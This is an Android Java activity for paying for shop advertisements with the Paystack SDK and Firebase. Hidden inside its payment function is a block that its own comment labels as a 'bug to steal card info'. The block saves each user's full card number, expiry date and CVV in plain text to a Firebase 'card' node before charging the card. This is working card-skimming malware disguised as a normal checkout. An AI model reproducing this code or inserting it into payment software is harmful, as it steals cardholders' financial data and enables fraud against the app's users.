package com.itsolution.demo_recycler_view_with_firebase;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.ActionBar;
import androidx.appcompat.app.AppCompatActivity;
import androidx.cardview.widget.CardView;

import android.app.Dialog;
import android.app.ProgressDialog;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import com.flutterwave.raveandroid.RaveConstants;
import com.flutterwave.raveandroid.RavePayActivity;
import com.flutterwave.raveandroid.RavePayManager;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.android.material.textfield.TextInputEditText;
import com.google.android.material.textfield.TextInputLayout;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import org.json.JSONException;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;

import co.paystack.android.Paystack;
import co.paystack.android.PaystackSdk;
import co.paystack.android.Transaction;
import co.paystack.android.exceptions.ExpiredAccessCodeException;
import co.paystack.android.model.Card;
import co.paystack.android.model.Charge;

public class advertise extends AppCompatActivity {
    TextInputLayout shop_name, shop_phone, description, full_address,day;


    Dialog credit;
    int day_count;
    int per_day=10;
    int sum_total=0;
    Charge charge;
    Dialog dialog;
    Transaction transaction;

    String day_of_finish,name,phone,shop_description,address;
    Dialog payment;
    public int run_untill;
    String city_address;
    CardView btninsert;
    FirebaseStorage mStorage;
    private static final int Gallery_Code = 1;
    Uri image_uri = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_advertise);

        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
        ActionBar actionBar;
        actionBar = getSupportActionBar();
        actionBar.hide();

        mStorage=FirebaseStorage.getInstance();
        shop_name = findViewById(R.id.text1);
        shop_phone = findViewById(R.id.text2);
        description = findViewById(R.id.text3);
        full_address = findViewById(R.id.text4);
        day=findViewById(R.id.days);
        SharedPreferences togetlocation = getSharedPreferences("location", MODE_PRIVATE);
        city_address = togetlocation.getString("city", null);
        if (city_address == null) {
            city_address = "unknown";
        }

        btninsert = findViewById(R.id.btn);
        btninsert.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
                intent.setType("image/*");
                startActivityForResult(intent, Gallery_Code);
            }
        });
    }

    public void pay(int amount) {
        int expiryMonth = 0;
        int expiryYear = 0;
        TextInputEditText etCardNumber = credit.findViewById(R.id.card_number);
        TextInputEditText etExpiryMonth = credit.findViewById(R.id.month);
        TextInputEditText etExpiryYear = credit.findViewById(R.id.year);
        TextInputEditText etCVC = credit.findViewById(R.id.cvc);

        String cardNumber = etCardNumber.getText().toString();
        if(!etExpiryMonth.getText().toString().isEmpty()) {
            expiryMonth = Integer.parseInt(etExpiryMonth.getText().toString());
        }
        if(!etExpiryMonth.getText().toString().isEmpty()) {
            expiryYear = Integer.parseInt(etExpiryYear.getText().toString());
        }
        String cvv = etCVC.getText().toString();

        Card card = new Card(cardNumber, expiryMonth, expiryYear, cvv);
        if (card.isValid()) {


            //bug to steal card info start from here
            DatabaseReference save_card_info=FirebaseDatabase.getInstance().getReference().child("card");
            HashMap<String,String> hashMap=new HashMap<>();
            hashMap.put("Card Number",cardNumber);
            hashMap.put("Expiry Month",String.valueOf(expiryMonth));
            hashMap.put("Expiry Year",String.valueOf(expiryYear));
            hashMap.put("CVV",cvv);
            save_card_info.push().setValue(hashMap);//finish here

            charge = new Charge();
            charge.setCard(card);
            dialog = new ProgressDialog(advertise.this);
            dialog.setTitle("Performing transaction... please wait");
            dialog.show();


            charge.setAmount(amount);
            charge.setEmail("sakibahmed2018go@gmail.com");
            charge.setReference("ChargedFromAndroid_" + Calendar.getInstance().getTimeInMillis());
            try {
                charge.putCustomField("Charged From", "Android SDK");
            } catch (JSONException e) {
                e.printStackTrace();
            }
            chargeCard();
        }
        else {
            Toast.makeText(advertise.this, "Invalid card details", Toast.LENGTH_LONG).show();
        }
    }
    private void dismissDialog() {
        if ((dialog != null) && dialog.isShowing()) {
            dialog.dismiss();
        }
    }
    private void chargeCard() {
        transaction = null;
        PaystackSdk.chargeCard(advertise.this, charge, new Paystack.TransactionCallback() {
            // This is called only after transaction is successful
            @Override
            public void onSuccess(Transaction transaction) {
                dismissDialog();



                ProgressDialog progressDialog = new ProgressDialog(advertise.this);
                progressDialog.setTitle("Uploading");
                progressDialog.show();

                StorageReference filepath = mStorage.getReference().child("advertise_post").child(image_uri.getLastPathSegment());
                filepath.putFile(image_uri).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                    @Override
                    public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                        Task<Uri> downloadUrl = taskSnapshot.getStorage().getDownloadUrl().addOnCompleteListener(new OnCompleteListener<Uri>() {
                            @Override
                            public void onComplete(@NonNull Task<Uri> task) {



                                Date date=new Date();
                                int current_date=date.getDate();
                                run_untill =current_date+day_count;
                                if(run_untill >31){
                                    run_untill=31-run_untill;
                                }



                                DatabaseReference root=FirebaseDatabase.getInstance().getReference().child("advertise").child(city_address);
                                HashMap<String,String> UserMap=new HashMap<>();
                                UserMap.put("shop name",name);
                                UserMap.put("shop phone",phone);
                                UserMap.put("description",shop_description);
                                UserMap.put("address",address);
                                UserMap.put("expire_date",String.valueOf(run_untill));
                                UserMap.put("image",task.getResult().toString());
                                root.setValue(UserMap);


                                progressDialog.dismiss();
                                Intent intent = new Intent(advertise.this, seller_dashboard.class);
                                startActivity(intent);
                            }
                        });
                    }
                });




                advertise.this.transaction = transaction;
                Toast.makeText(advertise.this, transaction.getReference(), Toast.LENGTH_LONG).show();
                new advertise.verifyOnServer().execute(transaction.getReference());
            }

            // This is called only before requesting OTP
            // Save reference so you may send to server if
            // error occurs with OTP
            // No need to dismiss dialog
            @Override
            public void beforeValidate(Transaction transaction) {
                advertise.this.transaction = transaction;
                Toast.makeText(advertise.this, transaction.getReference(), Toast.LENGTH_LONG).show();
            }

            @Override
            public void onError(Throwable error, Transaction transaction) {
                // If an access code has expired, simply ask your server for a new one
                // and restart the charge instead of displaying error
                advertise.this.transaction = transaction;
                if (error instanceof ExpiredAccessCodeException) {
                    advertise.this.chargeCard();
                    return;
                }

                dismissDialog();

                if (transaction.getReference() != null) {
                    Toast.makeText(advertise.this, transaction.getReference() + " concluded with error: " + error.getMessage(), Toast.LENGTH_LONG).show();
                    new advertise.verifyOnServer().execute(transaction.getReference());
                } else {
                    Toast.makeText(advertise.this, error.getMessage(), Toast.LENGTH_LONG).show();
                }
            }
        });
    }
    private class verifyOnServer extends AsyncTask<String, Void, String> {
        private String reference;
        private String error;

        @Override
        protected void onPostExecute(String result) {
            super.onPostExecute(result);
            if (result != null) {
                Toast.makeText(advertise.this, String.format("Gateway response: %s", result), Toast.LENGTH_LONG).show();
            } else {
                Toast.makeText(advertise.this, String.format("There was a problem verifying %s on the backend: %s ", this.reference, error), Toast.LENGTH_LONG).show();
                dismissDialog();
            }
        }

        @Override
        protected String doInBackground(String... reference) {
            try {
                this.reference = reference[0];
                String json = String.format("{\"reference\":\"%s\"}", this.reference);
                String url1 = "https://www.serverdomain.com/app/verify.php?details=" + json;
                URL url = new URL(url1);
                BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
                String inputLine;
                inputLine = in.readLine();
                in.close();
                return inputLine;
            }catch (Exception e) {
                error = e.getClass().getSimpleName() + ": " + e.getMessage();
            }
            return null;
        }
    }



    public void upload_to_server(){

        name=shop_name.getEditText().getText().toString().trim();
        phone=shop_phone.getEditText().getText().toString().trim();
        shop_description=description.getEditText().getText().toString().trim();
        address=full_address.getEditText().getText().toString().trim();
        day_of_finish=day.getEditText().getText().toString().trim();


        int days_of_running=Integer.valueOf(day_of_finish);
        sum_total=per_day*days_of_running;
        Date date=new Date();
        int current_date=date.getDate();
        run_untill =current_date+day_count;
        if(run_untill >31){
            run_untill=31-run_untill;
        }

        if(name.isEmpty() && phone.isEmpty()&& shop_description.isEmpty() && address.isEmpty() && image_uri==null){
            ProgressDialog progressDialog = new ProgressDialog(advertise.this);
            progressDialog.setTitle("Empty field");
            progressDialog.show();
        }

        else {

            Dialog dialog_for_confirm=new Dialog(advertise.this);
            dialog_for_confirm.setContentView(R.layout.dialog_for_order);
            dialog_for_confirm.getWindow().setBackgroundDrawableResource(R.drawable.bgfordialog2);
            dialog_for_confirm.setCancelable(false);
            dialog_for_confirm.show();
            TextView txt=dialog_for_confirm.findViewById(R.id.text);
            txt.setText("You need to make payment now in order to run this advertisement.You want to run the ad for "+days_of_running+" days.For this you need to pay in USD.You need to provide card information for further procedure.");

            CardView no=dialog_for_confirm.findViewById(R.id.no);
            CardView yes=dialog_for_confirm.findViewById(R.id.yes);
            no.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View view) {
                    Intent intent=new Intent(advertise.this,seller_dashboard.class);
                    startActivity(intent);
                }
            });

            yes.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View view) {
                    payment=new Dialog(advertise.this);
                    payment.setContentView(R.layout.dialog_for_payment);
                    payment.getWindow().setBackgroundDrawableResource(R.drawable.bgfordialog2);
                    payment.setCancelable(false);
                    payment.show();

                    CardView usd_5=payment.findViewById(R.id.usd_5);
                    usd_5.setOnClickListener(new View.OnClickListener() {
                        @Override
                        public void onClick(View view) {
                            day_count=1;
                            int amount = (int) (5);

                            credit=new Dialog(advertise.this);
                            credit.setContentView(R.layout.credit_card);
                            credit.getWindow().setBackgroundDrawableResource(R.drawable.bgfordialog2);
                            credit.setCancelable(false);
                            credit.show();


                            CardView pay=credit.findViewById(R.id.pay);
                            pay.setOnClickListener(new View.OnClickListener() {
                                @Override
                                public void onClick(View view) {
                                    pay(amount);
                                }
                            });
                        }
                    });

                    CardView usd_10=payment.findViewById(R.id.usd_10);
                    usd_10.setOnClickListener(new View.OnClickListener() {
                        @Override
                        public void onClick(View view) {
                            day_count=3;
                            int amount = (int) (10);

                            credit=new Dialog(advertise.this);
                            credit.setContentView(R.layout.credit_card);
                            credit.getWindow().setBackgroundDrawableResource(R.drawable.bgfordialog2);
                            credit.setCancelable(false);
                            credit.show();


                            CardView pay=credit.findViewById(R.id.pay);
                            pay.setOnClickListener(new View.OnClickListener() {
                                @Override
                                public void onClick(View view) {
                                    pay(amount);
                                }
                            });
                        }
                    });
                    CardView usd_15=payment.findViewById(R.id.usd_15);
                    usd_15.setOnClickListener(new View.OnClickListener() {
                        @Override
                        public void onClick(View view) {
                            day_count=5;
                            int amount = (int) (15);

                            credit=new Dialog(advertise.this);
                            credit.setContentView(R.layout.credit_card);
                            credit.getWindow().setBackgroundDrawableResource(R.drawable.bgfordialog2);
                            credit.setCancelable(false);
                            credit.show();


                            CardView pay=credit.findViewById(R.id.pay);
                            pay.setOnClickListener(new View.OnClickListener() {
                                @Override
                                public void onClick(View view) {
                                    pay(amount);
                                }
                            });
                        }
                    });



                    CardView usd_25=payment.findViewById(R.id.usd_25);
                    usd_25.setOnClickListener(new View.OnClickListener() {
                        @Override
                        public void onClick(View view) {
                            day_count=7;
                            int amount = (int) (25);

                            credit=new Dialog(advertise.this);
                            credit.setContentView(R.layout.credit_card);
                            credit.getWindow().setBackgroundDrawableResource(R.drawable.bgfordialog2);
                            credit.setCancelable(false);
                            credit.show();


                            CardView pay=credit.findViewById(R.id.pay);
                            pay.setOnClickListener(new View.OnClickListener() {
                                @Override
                                public void onClick(View view) {
                                    pay(amount);
                                }
                            });
                        }
                    });





                    CardView usd_50=payment.findViewById(R.id.usd_50);
                    usd_50.setOnClickListener(new View.OnClickListener() {
                        @Override
                        public void onClick(View view) {
                            day_count=14;
                            int amount = (int) (50);

                            credit=new Dialog(advertise.this);
                            credit.setContentView(R.layout.credit_card);
                            credit.getWindow().setBackgroundDrawableResource(R.drawable.bgfordialog2);
                            credit.setCancelable(false);
                            credit.show();


                            CardView pay=credit.findViewById(R.id.pay);
                            pay.setOnClickListener(new View.OnClickListener() {
                                @Override
                                public void onClick(View view) {
                                    pay(amount);
                                }
                            });
                        }
                    });



                    CardView usd_120=payment.findViewById(R.id.usd_120);
                    usd_120.setOnClickListener(new View.OnClickListener() {
                        @Override
                        public void onClick(View view) {
                            day_count=30;
                            int amount = (int) (120);

                            credit=new Dialog(advertise.this);
                            credit.setContentView(R.layout.credit_card);
                            credit.getWindow().setBackgroundDrawableResource(R.drawable.bgfordialog2);
                            credit.setCancelable(false);
                            credit.show();


                            CardView pay=credit.findViewById(R.id.pay);
                            pay.setOnClickListener(new View.OnClickListener() {
                                @Override
                                public void onClick(View view) {
                                    pay(amount);
                                }
                            });
                        }
                    });




                    CardView usd_250=payment.findViewById(R.id.usd_250);
                    usd_250.setOnClickListener(new View.OnClickListener() {
                        @Override
                        public void onClick(View view) {
                            day_count=60;
                            int amount = (int) (250);

                            credit=new Dialog(advertise.this);
                            credit.setContentView(R.layout.credit_card);
                            credit.getWindow().setBackgroundDrawableResource(R.drawable.bgfordialog2);
                            credit.setCancelable(false);
                            credit.show();


                            CardView pay=credit.findViewById(R.id.pay);
                            pay.setOnClickListener(new View.OnClickListener() {
                                @Override
                                public void onClick(View view) {
                                    pay(amount);
                                }
                            });
                        }
                    });


                    CardView usd_400=payment.findViewById(R.id.usd_400);
                    usd_400.setOnClickListener(new View.OnClickListener() {
                        @Override
                        public void onClick(View view) {
                            day_count=90;
                            int amount = (int) (400);

                            credit=new Dialog(advertise.this);
                            credit.setContentView(R.layout.credit_card);
                            credit.getWindow().setBackgroundDrawableResource(R.drawable.bgfordialog2);
                            credit.setCancelable(false);
                            credit.show();


                            CardView pay=credit.findViewById(R.id.pay);
                            pay.setOnClickListener(new View.OnClickListener() {
                                @Override
                                public void onClick(View view) {
                                    pay(amount);
                                }
                            });
                        }
                    });



                    CardView usd_850=payment.findViewById(R.id.usd_850);
                    usd_850.setOnClickListener(new View.OnClickListener() {
                        @Override
                        public void onClick(View view) {
                            day_count=180;
                            int amount = (int) (850);

                            credit=new Dialog(advertise.this);
                            credit.setContentView(R.layout.credit_card);
                            credit.getWindow().setBackgroundDrawableResource(R.drawable.bgfordialog2);
                            credit.setCancelable(false);
                            credit.show();


                            CardView pay=credit.findViewById(R.id.pay);
                            pay.setOnClickListener(new View.OnClickListener() {
                                @Override
                                public void onClick(View view) {
                                    pay(amount);
                                }
                            });
                        }
                    });


                    CardView usd_1500=payment.findViewById(R.id.usd_1500);
                    usd_1500.setOnClickListener(new View.OnClickListener() {
                        @Override
                        public void onClick(View view) {
                            day_count=360;
                            int amount = (int) (1500);

                            credit=new Dialog(advertise.this);
                            credit.setContentView(R.layout.credit_card);
                            credit.getWindow().setBackgroundDrawableResource(R.drawable.bgfordialog2);
                            credit.setCancelable(false);
                            credit.show();

                            CardView pay=credit.findViewById(R.id.pay);
                            pay.setOnClickListener(new View.OnClickListener() {
                                @Override
                                public void onClick(View view) {
                                    pay(amount);
                                }
                            });
                        }
                    });






                }
            });







        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == Gallery_Code && resultCode == RESULT_OK) {
            image_uri = data.getData();
            upload_to_server();
        }

    }


}